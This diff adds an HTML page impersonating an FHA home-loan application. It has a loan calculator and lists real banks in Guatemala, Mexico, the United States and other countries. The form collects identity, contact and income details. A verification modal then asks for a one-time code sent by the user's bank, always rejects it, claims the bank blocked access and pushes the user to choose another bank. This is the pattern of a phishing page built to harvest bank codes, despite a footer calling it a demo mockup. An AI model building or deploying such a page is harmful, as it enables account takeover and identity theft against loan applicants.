@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FHA — Solicita tu crédito de vivienda</title>
+<style>
+  :root{
+    --navy:#0a2540;--navy-2:#0e3357;--blue:#0a56b0;--gold:#c9a24b;--gold-soft:#e6d3a3;
+    --paper:#ffffff;--mist:#f5f7fa;--ink:#0a2540;--muted:#5a6b7d;--line:#e2e8f0;--green:#1f9d63;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;color:var(--ink);background:var(--mist);-webkit-font-smoothing:antialiased;line-height:1.5}
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+  .serif{font-family:'Georgia',serif}
+
+  header{position:sticky;top:0;z-index:50;background:var(--navy);color:#fff}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:70px}
+  .logo{display:flex;align-items:center;gap:12px}
+  .logo .txt{font-family:'Georgia',serif;font-weight:700;font-size:22px;line-height:1}
+  .logo .txt small{display:block;font-family:'Helvetica Neue',sans-serif;font-size:9px;letter-spacing:2px;color:var(--gold-soft);font-weight:400;margin-top:3px;font-style:italic}
+  nav{display:flex;gap:28px;font-size:14px;color:#c7d3e0}
+  nav a:hover{color:#fff}
+  @media(max-width:760px){nav{display:none}}
+
+  /* Hero */
+  .hero{background:linear-gradient(160deg,var(--navy),var(--navy-2));color:#fff;padding:60px 0 50px;position:relative;overflow:hidden}
+  .hero::after{content:"";position:absolute;right:-100px;top:-100px;width:380px;height:380px;background:radial-gradient(circle,rgba(201,162,75,.16),transparent 70%)}
+  .hero-in{position:relative;z-index:2;max-width:640px}
+  .eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2px;color:var(--gold-soft);border:1px solid rgba(201,162,75,.4);padding:8px 16px;border-radius:999px;margin-bottom:22px}
+  .hero h1{font-family:'Georgia',serif;font-size:clamp(32px,5vw,52px);line-height:1.08;letter-spacing:-.5px}
+  .hero h1 em{color:var(--gold);font-style:italic}
+  .hero p{color:#c7d3e0;margin-top:16px;font-size:18px;max-width:520px}
+  .hero .perks{display:flex;gap:24px;margin-top:26px;flex-wrap:wrap}
+  .perk{display:flex;align-items:center;gap:9px;font-size:14px;color:#dbe4ef}
+  .perk b{color:var(--gold);font-size:18px}
+
+  /* Main layout */
+  .main{padding:56px 0 80px}
+  .grid{display:grid;grid-template-columns:1.4fr .9fr;gap:32px;align-items:start}
+  @media(max-width:900px){.grid{grid-template-columns:1fr}}
+
+  .card{background:#fff;border-radius:18px;border:1px solid var(--line);box-shadow:0 20px 50px -35px rgba(10,37,64,.4);overflow:hidden}
+  .card-head{background:var(--navy);color:#fff;padding:22px 28px}
+  .card-head h2{font-family:'Georgia',serif;font-size:22px;font-weight:700}
+  .card-head p{font-size:13px;color:#b9c6d6;margin-top:3px}
+  .card-body{padding:28px}
+
+  /* Progress steps */
+  .prog{display:flex;gap:0;margin-bottom:26px}
+  .prog .s{flex:1;text-align:center;position:relative;font-size:11px;color:var(--muted)}
+  .prog .s .c{width:30px;height:30px;border-radius:50%;background:var(--mist);border:2px solid var(--line);color:var(--muted);display:flex;align-items:center;justify-content:center;font-weight:700;margin:0 auto 6px;font-size:13px;position:relative;z-index:2}
+  .prog .s.on .c{background:var(--gold);border-color:var(--gold);color:var(--navy)}
+  .prog .s.on{color:var(--navy);font-weight:700}
+  .prog .s::before{content:"";position:absolute;top:15px;left:-50%;width:100%;height:2px;background:var(--line);z-index:1}
+  .prog .s:first-child::before{display:none}
+
+  .sect-title{font-size:13px;font-weight:700;color:var(--navy);text-transform:uppercase;letter-spacing:1px;margin:22px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--line)}
+  .sect-title:first-child{margin-top:0}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  @media(max-width:520px){.row{grid-template-columns:1fr}}
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:600}
+  .field input,.field select{width:100%;padding:11px 13px;border:1px solid var(--line);border-radius:9px;font-size:14px;color:var(--ink);font-family:inherit;background:#fff;transition:border-color .15s}
+  .field input:focus,.field select:focus{outline:none;border-color:var(--blue)}
+  .field .hint{font-size:11px;color:var(--muted);margin-top:4px}
+
+  .btn{width:100%;background:var(--gold);color:var(--navy);border:none;padding:15px;border-radius:11px;font-size:16px;font-weight:800;cursor:pointer;font-family:inherit;transition:transform .12s,box-shadow .12s;margin-top:8px}
+  .btn:hover{transform:translateY(-2px);box-shadow:0 12px 28px -12px rgba(201,162,75,.7)}
+
+  .consent{display:flex;gap:10px;align-items:flex-start;margin:6px 0 4px;font-size:12px;color:var(--muted)}
+  .consent input{margin-top:2px}
+
+  /* Calculator sidebar */
+  .calc{position:sticky;top:90px}
+  .calc .card-head{background:linear-gradient(135deg,var(--blue),var(--navy))}
+  .calc-field{margin-bottom:18px}
+  .calc-field .lab{display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-bottom:7px;font-weight:600}
+  .calc-field .lab b{color:var(--navy);font-size:14px}
+  .calc-field input[type=range]{width:100%;accent-color:var(--gold);height:5px}
+  .result{background:var(--navy);color:#fff;border-radius:14px;padding:22px;text-align:center;margin-top:6px}
+  .result .big{font-size:34px;font-weight:800;color:var(--gold);font-family:'Georgia',serif}
+  .result .lab{font-size:12px;color:#b9c6d6;margin-top:2px}
+  .result .split{display:flex;justify-content:space-around;margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.15)}
+  .result .split div{font-size:10px;color:#b9c6d6}
+  .result .split b{display:block;font-size:14px;color:#fff;margin-top:2px}
+  .disc{font-size:11px;color:var(--muted);margin-top:14px;line-height:1.5;text-align:center}
+
+  /* Success message */
+  .ok{display:none;text-align:center;padding:20px 10px}
+  .ok .ic{width:64px;height:64px;border-radius:50%;background:var(--green);color:#fff;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 18px}
+  .ok h3{font-family:'Georgia',serif;font-size:24px;color:var(--navy);margin-bottom:8px}
+  .ok p{color:var(--muted);font-size:15px;max-width:360px;margin:0 auto}
+
+  footer{background:var(--navy);color:#7d90a6;padding:34px 0;font-size:12px}
+  .foot{display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;align-items:center}
+  .disc-foot{max-width:1120px;margin:18px auto 0;padding:0 24px;font-size:11px;color:#5f748f;line-height:1.6}
+
+  .logo-svg{flex-shrink:0}
+
+  /* Modal verificación */
+  .overlay{display:none;position:fixed;inset:0;background:rgba(10,37,64,.6);backdrop-filter:blur(4px);z-index:100;align-items:center;justify-content:center;padding:20px}
+  .overlay.show{display:flex}
+  .modal{background:#fff;border-radius:20px;max-width:420px;width:100%;padding:32px 28px;position:relative;box-shadow:0 30px 70px -20px rgba(0,0,0,.5);text-align:center;animation:pop .2s ease}
+  @keyframes pop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .modal .x{position:absolute;top:16px;right:18px;width:32px;height:32px;border-radius:50%;background:var(--mist);border:none;font-size:18px;color:var(--muted);cursor:pointer;line-height:1;transition:background .15s}
+  .modal .x:hover{background:#e2e8f0;color:var(--navy)}
+  .modal .mic{width:60px;height:60px;border-radius:16px;background:var(--navy);color:var(--gold);display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 18px}
+  .modal h3{font-family:'Georgia',serif;font-size:22px;color:var(--navy);margin-bottom:8px}
+  .modal p{font-size:14px;color:var(--muted);margin-bottom:22px;line-height:1.5}
+  .modal p b{color:var(--navy)}
+  .otp{display:flex;gap:9px;justify-content:center;margin-bottom:22px}
+  .otp input{width:44px;height:54px;text-align:center;font-size:22px;font-weight:800;color:var(--navy);border:2px solid var(--line);border-radius:11px;transition:border-color .15s}
+  .otp input:focus{outline:none;border-color:var(--gold)}
+  .modal .btn{margin-top:0}
+  .resend{font-size:12px;color:var(--muted);margin-top:16px}
+  .resend a{color:var(--blue);font-weight:600;cursor:pointer}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap bar">
+    <div class="logo">
+      <svg class="logo-svg" width="46" height="38" viewBox="0 0 130 112" xmlns="http://www.w3.org/2000/svg" aria-label="FHA">
+        <polygon points="60,4 120,49 108,59 60,22 12,59 0,49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3" stroke-linejoin="round"/>
+        <rect x="18" y="59" width="18" height="49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <rect x="94" y="59" width="18" height="49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <rect x="52" y="52" width="16" height="56" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <polygon points="52,52 60,42 68,52" fill="#0a56b0" stroke="#c9a24b" stroke-width="3" stroke-linejoin="round"/>
+        <rect x="10" y="108" width="110" height="4" fill="#c9a24b"/>
+      </svg>
+      <div class="txt">FHA<small>FACILITAMOS TU VIVIENDA</small></div>
+    </div>
+    <nav>
+      <a href="#">Inicio</a>
+      <a href="#solicitud">Solicitar crédito</a>
+      <a href="#">Contacto</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap hero-in">
+    <div class="eyebrow">🏠 FINANCIAMIENTO FHA</div>
+    <h1>Asegura tu crédito con el <em>financiamiento FHA</em>.</h1>
+    <p>Condiciones flexibles y cuota inicial baja para hacer realidad tu vivienda. Completa la solicitud en línea y recibe una respuesta preliminar en minutos.</p>
+    <div class="perks">
+      <div class="perk"><b>3.5%</b> cuota inicial</div>
+      <div class="perk"><b>30</b> años de plazo</div>
+      <div class="perk"><b>24h</b> respuesta</div>
+    </div>
+  </div>
+</section>
+
+<section class="main" id="solicitud">
+  <div class="wrap grid">
+
+    <!-- Formulario -->
+    <div class="card">
+      <div class="card-head">
+        <h2>Solicitud de crédito</h2>
+        <p>Completa tus datos. La información es solo una simulación de demostración.</p>
+      </div>
+      <div class="card-body">
+        <div class="prog">
+          <div class="s on"><div class="c">1</div>Datos</div>
+          <div class="s on"><div class="c">2</div>Ingresos</div>
+          <div class="s on"><div class="c">3</div>Crédito</div>
+        </div>
+
+        <form id="fhaForm">
+          <div class="sect-title">Datos personales</div>
+          <div class="row">
+            <div class="field"><label>Nombre completo</label><input type="text" placeholder="Ej. Juan Pérez" required></div>
+            <div class="field"><label>Documento de identidad</label><input type="text" placeholder="N° de cédula/DPI" required></div>
+          </div>
+          <div class="row">
+            <div class="field"><label>Correo electrónico</label><input type="email" placeholder="tucorreo@ejemplo.com" required></div>
+            <div class="field"><label>Teléfono</label><input type="tel" placeholder="+502 0000 0000" required></div>
+          </div>
+
+          <div class="sect-title">Información laboral e ingresos</div>
+          <div class="row">
+            <div class="field"><label>Situación laboral</label>
+              <select required><option value="">Selecciona…</option><option>Empleado dependiente</option><option>Independiente</option><option>Empresario</option><option>Jubilado</option></select>
+            </div>
+            <div class="field"><label>Ingreso mensual (Q)</label><input type="number" placeholder="Ej. 8000" required></div>
+          </div>
+          <div class="row">
+            <div class="field"><label>Antigüedad laboral</label>
+              <select required><option value="">Selecciona…</option><option>Menos de 1 año</option><option>1 a 3 años</option><option>3 a 5 años</option><option>Más de 5 años</option></select>
+            </div>
+            <div class="field"><label>Otros ingresos mensuales (Q)</label><input type="number" placeholder="Opcional"></div>
+          </div>
+
+          <div class="sect-title">Datos del crédito</div>
+          <div class="row">
+            <div class="field"><label>Tipo de crédito FHA</label>
+              <select required><option value="">Selecciona…</option><option>FHA 203(b) — Compra de vivienda</option><option>FHA 203(k) — Compra + remodelación</option><option>Refinanciamiento FHA</option></select>
+            </div>
+            <div class="field"><label>Departamento / Región</label><input type="text" placeholder="Ej. Guatemala" required></div>
+          </div>
+          <div class="field"><label>Destino del crédito</label>
+            <select required><option value="">Selecciona…</option><option>Compra de casa</option><option>Compra de apartamento</option><option>Construcción</option><option>Remodelación</option></select>
+          </div>
+          <div class="row">
+            <div class="field"><label>País</label>
+              <select id="pais" required><option value="">Selecciona…</option><option>Guatemala</option><option>Bolivia</option><option>México</option><option>Colombia</option><option>Perú</option><option>Chile</option><option>Argentina</option><option>Estados Unidos</option></select>
+            </div>
+            <div class="field"><label>Entidad financiera</label>
+              <select id="entidad" required disabled><option value="">Primero elige un país…</option></select>
+            </div>
+          </div>
+
+          <label class="consent"><input type="checkbox" required> Autorizo el tratamiento de mis datos para evaluar mi solicitud de crédito según los términos y políticas de privacidad.</label>
+
+          <button type="submit" class="btn">Enviar solicitud →</button>
+        </form>
+
+        <div class="ok" id="okMsg">
+          <div class="ic">✓</div>
+          <h3>¡Solicitud enviada!</h3>
+          <p>Hemos recibido tu solicitud de crédito FHA. Un asesor se pondrá en contacto contigo en las próximas 24 horas con tu respuesta preliminar.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Calculadora -->
+    <div class="calc">
+      <div class="card">
+        <div class="card-head">
+          <h2>Calculadora de cuota</h2>
+          <p>Estima tu pago mensual</p>
+        </div>
+        <div class="card-body">
+          <div class="calc-field">
+            <div class="lab"><span>Valor de la vivienda</span><b id="vHome">Q 500,000</b></div>
+            <input type="range" id="home" min="100000" max="2000000" step="10000" value="500000">
+          </div>
+          <div class="calc-field">
+            <div class="lab"><span>Cuota inicial</span><b id="vDown">3.5% · Q 17,500</b></div>
+            <input type="range" id="down" min="3.5" max="30" step="0.5" value="3.5">
+          </div>
+          <div class="calc-field">
+            <div class="lab"><span>Plazo</span><b id="vTerm">30 años</b></div>
+            <input type="range" id="term" min="10" max="30" step="5" value="30">
+          </div>
+          <div class="calc-field">
+            <div class="lab"><span>Tasa de interés anual</span><b id="vRate">7.5%</b></div>
+            <input type="range" id="rate" min="4" max="14" step="0.1" value="7.5">
+          </div>
+
+          <div class="result">
+            <div class="big" id="monthly">Q 3,371</div>
+            <div class="lab">cuota mensual estimada</div>
+            <div class="split">
+              <div>Monto financiado<b id="loan">Q 482,500</b></div>
+              <div>Total a pagar<b id="total">Q 1,213,560</b></div>
+            </div>
+          </div>
+          <p class="disc">Cálculo referencial de demostración. No constituye una oferta de crédito. Las condiciones finales dependen de la evaluación y del prestamista aprobado FHA.</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot">
+    <div class="logo">
+      <svg width="40" height="33" viewBox="0 0 130 112" xmlns="http://www.w3.org/2000/svg" aria-label="FHA">
+        <polygon points="60,4 120,49 108,59 60,22 12,59 0,49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3" stroke-linejoin="round"/>
+        <rect x="18" y="59" width="18" height="49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <rect x="94" y="59" width="18" height="49" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <rect x="52" y="52" width="16" height="56" fill="#0a56b0" stroke="#c9a24b" stroke-width="3"/>
+        <polygon points="52,52 60,42 68,52" fill="#0a56b0" stroke="#c9a24b" stroke-width="3" stroke-linejoin="round"/>
+        <rect x="10" y="108" width="110" height="4" fill="#c9a24b"/>
+      </svg>
+      <div class="txt" style="color:#fff">FHA</div>
+    </div>
+    <div>© 2026 FHA · Facilitamos tu vivienda</div>
+    <div>Privacidad · Términos · Contacto</div>
+  </div>
+  <div class="disc-foot">
+    Aviso: esta página es un mockup de demostración creado como propuesta. No constituye una oferta vinculante de crédito ni representa una solicitud oficial. Toda evaluación de crédito está sujeta a los requisitos y aprobación de la entidad correspondiente.
+  </div>
+</footer>
+
+<!-- Modal verificación OTP -->
+<div class="overlay" id="otpModal">
+  <div class="modal">
+    <button class="x" id="closeOtp" aria-label="Cerrar">✕</button>
+
+    <!-- PASO 1: ingresar código -->
+    <div id="otpStep1">
+      <div class="mic">🔒</div>
+      <h3>Verifica tu identidad</h3>
+      <p id="otpMsg">Ingresa el código de 6 dígitos que llegará a tu entidad <b id="entidadNombre"></b> para validar la solicitud.</p>
+      <div class="otp">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+      </div>
+      <!-- Estado: verificando -->
+      <div id="otpVerifying" style="display:none;text-align:center;padding:16px 0">
+        <div style="width:44px;height:44px;border:4px solid #e2e8f0;border-top-color:#0a56b0;border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 12px"></div>
+        <p style="color:#5a6b7d;font-size:14px">Verificando con <b id="verifyingNombre"></b>…</p>
+      </div>
+      <!-- Estado: error -->
+      <div id="otpError" style="display:none;border-radius:12px;overflow:hidden;margin:10px 0;box-shadow:0 4px 16px rgba(192,57,43,.13)">
+        <div style="background:#c0392b;color:#fff;padding:12px 16px;display:flex;align-items:center;gap:10px">
+          <span style="font-size:20px">🚫</span>
+          <b style="font-size:14px">Verificación fallida</b>
+        </div>
+        <div style="background:#fff8f8;padding:12px 16px;font-size:13px;color:#7b2d2d;line-height:1.6">
+          <span id="otpErrorMsg"></span>
+        </div>
+        <div style="background:#fce8e8;padding:8px 16px;display:flex;align-items:center;gap:8px">
+          <span style="font-size:12px;color:#c0392b;flex:1" id="otpCountdownTxt">Redirigiendo en 8s…</span>
+          <div style="flex:1;height:5px;background:#f5c2c2;border-radius:99px;overflow:hidden">
+            <div id="otpBar" style="height:100%;width:100%;background:#c0392b;border-radius:99px;transition:width linear"></div>
+          </div>
+        </div>
+      </div>
+      <button class="btn" id="confirmOtp" style="margin-top:8px">Confirmar código →</button>
+      <div class="resend">¿No recibiste el código? <a id="resend" style="cursor:pointer">Reenviar</a></div>
+    </div>
+
+    <!-- PASO 2: error entidad agotada, elegir otra -->
+    <div id="otpStep2" style="display:none">
+      <div class="mic">⚠️</div>
+      <h3>Entidad no disponible</h3>
+      <p id="otpStep2Msg"></p>
+      <div style="margin:18px 0">
+        <label style="font-size:13px;font-weight:600;color:#0a2540;display:block;margin-bottom:6px">Selecciona otra entidad</label>
+        <select id="otpEntidadSelect" style="width:100%;padding:10px 14px;border-radius:10px;border:1.5px solid #c9a24b;font-size:15px;color:#0a2540;outline:none"></select>
+      </div>
+      <button class="btn" id="otpCambiarEntidad">Intentar con esta entidad →</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // --- Monedas por país ---
+  const monedas = {
+    "Guatemala": {simbolo:"Q", locale:"es-GT"},
+    "Bolivia": {simbolo:"Bs", locale:"es-BO"},
+    "México": {simbolo:"$", locale:"es-MX"},
+    "Colombia": {simbolo:"$", locale:"es-CO"},
+    "Perú": {simbolo:"S/", locale:"es-PE"},
+    "Chile": {simbolo:"$", locale:"es-CL"},
+    "Argentina": {simbolo:"$", locale:"es-AR"},
+    "Estados Unidos": {simbolo:"US$", locale:"en-US"}
+  };
+  let monedaActual = monedas["Guatemala"];
+  const fmt = n => monedaActual.simbolo + " " + Math.round(n).toLocaleString(monedaActual.locale);
+
+  // --- Entidades por país ---
+  const entidades = {
+    "Guatemala": ["Banco Industrial","Banrural","G&T Continental","Banco de los Trabajadores (Bantrab)","BAM (Banco Agromercantil)","Banco Promerica","Vivibanco"],
+    "Bolivia": ["Banco Nacional de Bolivia (BNB)","Banco Mercantil Santa Cruz","Banco BISA","Banco de Crédito (BCP)","Banco Unión","Banco FIE","Banco Ganadero"],
+    "México": ["BBVA México","Banorte","Santander","Citibanamex","HSBC","Scotiabank","Banco Azteca","Infonavit"],
+    "Colombia": ["Bancolombia","Banco de Bogotá","Davivienda","BBVA Colombia","Banco de Occidente","Scotiabank Colpatria","Banco Caja Social"],
+    "Perú": ["Banco de Crédito (BCP)","BBVA Perú","Interbank","Scotiabank Perú","BanBif","Mibanco","Banco Pichincha"],
+    "Chile": ["Banco de Chile","BancoEstado","Santander Chile","BCI","Scotiabank Chile","Itaú","Banco Falabella"],
+    "Argentina": ["Banco Nación","Banco Provincia","Banco Galicia","BBVA Argentina","Banco Santander","Banco Macro","Banco Hipotecario"],
+    "Estados Unidos": ["Wells Fargo","Chase","Bank of America","Rocket Mortgage","U.S. Bank","Citi","PNC Bank"]
+  };
+
+  const paisSel = document.getElementById('pais'), entidadSel = document.getElementById('entidad');
+  paisSel.addEventListener('change', ()=>{
+    const list = entidades[paisSel.value] || [];
+    if(list.length){
+      entidadSel.disabled = false;
+      entidadSel.innerHTML = '<option value="">Selecciona tu entidad…</option>' + list.map(e=>`<option>${e}</option>`).join('');
+    } else {
+      entidadSel.disabled = true;
+      entidadSel.innerHTML = '<option value="">Primero elige un país…</option>';
+    }
+    monedaActual = monedas[paisSel.value] || monedas["Guatemala"];
+    calc();
+  });
+
+  // --- Lógica OTP ---
+  const modal       = document.getElementById('otpModal');
+  const boxes       = modal.querySelectorAll('.otp input');
+  const step1       = document.getElementById('otpStep1');
+  const step2       = document.getElementById('otpStep2');
+  const otpError    = document.getElementById('otpError');
+  const otpErrorMsg = document.getElementById('otpErrorMsg');
+  const entidadNomEl = document.getElementById('entidadNombre');
+  const step2Msg    = document.getElementById('otpStep2Msg');
+  const otpEntSel   = document.getElementById('otpEntidadSelect');
+
+  // Entidades descartadas en esta sesión
+  let entidadesUsadas = [];
+  let entidadActual   = '';
+
+  function getOtpValue(){ return Array.from(boxes).map(b=>b.value).join(''); }
+  function clearBoxes(){ boxes.forEach(b=>b.value=''); otpError.style.display='none'; }
+
+  function openOtp(){
+    entidadesUsadas = [];
+    entidadActual = entidadSel.value || (entidades[paisSel.value]||[])[0] || 'tu entidad';
+    mostrarStep1(entidadActual);
+    modal.classList.add('show');
+    boxes[0].focus();
+  }
+
+  function closeOtp(){
+    modal.classList.remove('show');
+    clearBoxes();
+    step1.style.display='block';
+    step2.style.display='none';
+    entidadesUsadas = [];
+    clearInterval(countdownInterval);
+    if(otpVerifying) otpVerifying.style.display='none';
+    document.getElementById('confirmOtp').style.display='block';
+    const resendParent = document.getElementById('resend');
+    if(resendParent) resendParent.parentElement.style.display='block';
+  }
+
+  function mostrarStep1(nombreEntidad){
+    step1.style.display='block';
+    step2.style.display='none';
+    clearBoxes();
+    entidadNomEl.textContent = nombreEntidad ? '('+nombreEntidad+')' : '';
+    boxes[0].focus();
+  }
+
+  function mostrarStep2(nombreEntidad){
+    step1.style.display='none';
+    step2.style.display='block';
+    // Marcar entidad actual como usada
+    entidadesUsadas.push(nombreEntidad);
+    step2Msg.innerHTML = `<b>${nombreEntidad}</b> no pudo validar el código. Por favor selecciona otra entidad financiera para continuar.`;
+    // Llenar selector con las que quedan
+    const listaPais = entidades[paisSel.value] || [];
+    const disponibles = listaPais.filter(e => !entidadesUsadas.includes(e));
+    if(disponibles.length === 0){
+      // Se agotaron todas
+      step2Msg.innerHTML = `Todas las entidades disponibles presentan inconvenientes en este momento. Por favor intenta de nuevo más tarde o comunícate con FHA.`;
+      otpEntSel.style.display='none';
+      document.getElementById('otpCambiarEntidad').style.display='none';
+    } else {
+      otpEntSel.style.display='block';
+      document.getElementById('otpCambiarEntidad').style.display='block';
+      otpEntSel.innerHTML = disponibles.map(e=>`<option>${e}</option>`).join('');
+    }
+  }
+
+  document.getElementById('closeOtp').addEventListener('click', closeOtp);
+  modal.addEventListener('click', e=>{ if(e.target===modal) closeOtp(); });
+
+  boxes.forEach((b,i)=>{
+    b.addEventListener('input', ()=>{ if(b.value && i<boxes.length-1) boxes[i+1].focus(); });
+    b.addEventListener('keydown', e=>{ if(e.key==='Backspace' && !b.value && i>0) boxes[i-1].focus(); });
+  });
+
+  document.getElementById('resend').addEventListener('click', ()=>{ clearBoxes(); boxes[0].focus(); });
+
+  const otpVerifying = document.getElementById('otpVerifying');
+  const verifyingNombre = document.getElementById('verifyingNombre');
+  const otpBar = document.getElementById('otpBar');
+  const otpCountdownTxt = document.getElementById('otpCountdownTxt');
+  let countdownInterval = null;
+
+  document.getElementById('confirmOtp').addEventListener('click', ()=>{
+    const codigo = getOtpValue();
+    if(codigo.length < 6){
+      otpError.style.display='block';
+      otpErrorMsg.textContent = 'Debes ingresar los 6 dígitos completos.';
+      return;
+    }
+
+    // Paso 1: mostrar spinner "Verificando…"
+    document.getElementById('confirmOtp').style.display = 'none';
+    document.getElementById('resend').parentElement.style.display = 'none';
+    otpError.style.display = 'none';
+    otpVerifying.style.display = 'block';
+    verifyingNombre.textContent = entidadActual;
+
+    // Después de 2.5s mostrar el error con cuenta regresiva de 8s
+    setTimeout(()=>{
+      otpVerifying.style.display = 'none';
+      otpError.style.display = 'block';
+      otpErrorMsg.innerHTML = `El código ingresado no es válido para <b>${entidadActual}</b>. La entidad ha rechazado la verificación y ha bloqueado temporalmente el acceso. Serás redirigido para seleccionar otra entidad.`;
+
+      // Barra regresiva 8 segundos
+      const TOTAL = 8000;
+      let elapsed = 0;
+      const interval = 80;
+      otpBar.style.transition = 'none';
+      otpBar.style.width = '100%';
+      clearInterval(countdownInterval);
+      countdownInterval = setInterval(()=>{
+        elapsed += interval;
+        const pct = Math.max(0, 100 - (elapsed / TOTAL * 100));
+        otpBar.style.width = pct + '%';
+        const secs = Math.ceil((TOTAL - elapsed) / 1000);
+        otpCountdownTxt.textContent = secs > 0 ? `Redirigiendo en ${secs}s…` : 'Redirigiendo…';
+        if(elapsed >= TOTAL){
+          clearInterval(countdownInterval);
+          mostrarStep2(entidadActual);
+          // Restaurar botones para el siguiente intento
+          document.getElementById('confirmOtp').style.display = 'block';
+          document.getElementById('resend').parentElement.style.display = 'block';
+        }
+      }, interval);
+    }, 2500);
+  });
+
+  document.getElementById('otpCambiarEntidad').addEventListener('click', ()=>{
+    entidadActual = otpEntSel.value;
+    // Actualizar también el select del formulario
+    for(let i=0;i<entidadSel.options.length;i++){
+      if(entidadSel.options[i].text === entidadActual){ entidadSel.selectedIndex=i; break; }
+    }
+    mostrarStep1(entidadActual);
+  });
+
+  // --- Calculadora ---
+  const home=document.getElementById('home'), down=document.getElementById('down'),
+        term=document.getElementById('term'), rate=document.getElementById('rate');
+
+  function calc(){
+    const H=+home.value, dPct=+down.value, T=+term.value, R=+rate.value;
+    const downAmt = H*dPct/100;
+    const loan = H - downAmt;
+    const i = R/100/12;
+    const n = T*12;
+    const m = i>0 ? loan*(i*Math.pow(1+i,n))/(Math.pow(1+i,n)-1) : loan/n;
+    const total = m*n;
+    document.getElementById('vHome').textContent = fmt(H);
+    document.getElementById('vDown').textContent = dPct+"% · "+fmt(downAmt);
+    document.getElementById('vTerm').textContent = T+" años";
+    document.getElementById('vRate').textContent = R.toFixed(1)+"%";
+    document.getElementById('monthly').textContent = fmt(m);
+    document.getElementById('loan').textContent = fmt(loan);
+    document.getElementById('total').textContent = fmt(total);
+  }
+  [home,down,term,rate].forEach(el=>el.addEventListener('input',calc));
+  calc();
+
+  document.getElementById('fhaForm').addEventListener('submit',function(e){
+    e.preventDefault();
+    openOtp();
+  });
+</script>
+
+</body>
+</html>
